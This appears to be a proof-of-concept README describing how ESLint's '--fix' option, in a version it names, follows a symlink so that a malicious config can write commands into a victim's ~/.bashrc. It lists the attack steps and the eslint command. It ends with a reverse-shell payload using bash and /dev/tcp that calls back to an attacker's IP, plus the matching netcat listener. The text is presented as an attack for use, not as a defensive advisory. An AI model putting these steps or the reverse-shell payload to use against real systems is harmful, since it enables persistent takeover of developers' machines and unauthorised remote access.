# ESLint-File-Overwrite

This is a weakness in ESlint v10.3.0 in which the "--fix" option will follow along symlinks and edit files at the end of them.

  ## Attack Chain Steps
  innocuous.js points to the ~/.bashrc
  Run the eslint command with --fix and point it at innocuous. The malicious config will execute commands and store data into our  ~/.bashrc.
  Open a new terminal or run "source ~/.bashrc"
  
  ## Run eslint on the innocuous symlink file
  ### This is almost guaranteed to get an error, but that's fine
  `eslint --fix innocuous.js`

  ## Wait for a developer to open a new shell or source our updated /.bashrc
  `source ~/.bashrc`
    
  ## Go fourth and conquer

  Better yet, create a reverse shell:
  const PAYLOAD = "\nbash -i >& /dev/tcp/<your ip>/<your port> 0>&1\n;"

  and have it connect to you on the attacking machine:
  `nc -lvnp <your port>`
  

